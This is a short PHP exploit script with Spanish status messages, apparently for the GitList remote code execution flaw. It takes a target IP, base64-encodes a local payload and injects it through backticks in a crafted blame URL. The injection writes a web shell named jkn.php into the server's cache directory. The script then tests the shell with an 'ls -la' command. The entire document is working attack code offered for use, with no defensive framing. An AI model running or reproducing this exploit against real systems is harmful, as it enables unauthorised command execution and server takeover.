<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd">
<HTML>
<HEAD></HEAD>
<BODY>
<?php
// 2016/10 JokinAU@EnigmaDOS
// basado en http://hatriot.github.io/blog/2014/06/29/gitlist-rce/

$maxtimeout=15;

$url=$_REQUEST['ip'];
$path='/var/www/html/gitlist/cache';
$filename='jkn.php';
$endurl='http://'.$url.'/gitlist/cache/'.$filename;

$payloadfile='resources/gitlist.php';
$payloadencoded=base64_encode(file_get_contents($payloadfile));
$payload='/blame/master/%22%22%60echo%20'.$payloadencoded.'%3D%3D%7Cbase64%20-d%20%3E%20';

$final='http://'.$url.'/gitlist/gitlist'.$payload.$path.'/'.$filename.'%60';
$salida=get_headers($final, 1);

if (strcmp($salida[0],'HTTP/1.0 500 Internal Server Error')==0):
	echo "<H2>Shell enviado</H2>\n";
	$checker=get_headers($endurl.'?cmd=ls -la', 1);
	if (strcmp($checker[0],'HTTP/1.1 200 OK')==0):
		echo "<p>Parece que la inyecci&oacute;n ha sido correcta y responde a las &oacute;rdenes!</p>\n";
	else:
		echo "<p>Pero parece que la inyecci&oacute;n ha tenido problemas, el payload no se encuentra en el servidor...</p>\n";
	endif;
else:
	echo '<H2>El ataque ha fallado!</H2>';
	var_dump($salida);
endif;
?>
</BODY>
</HTML>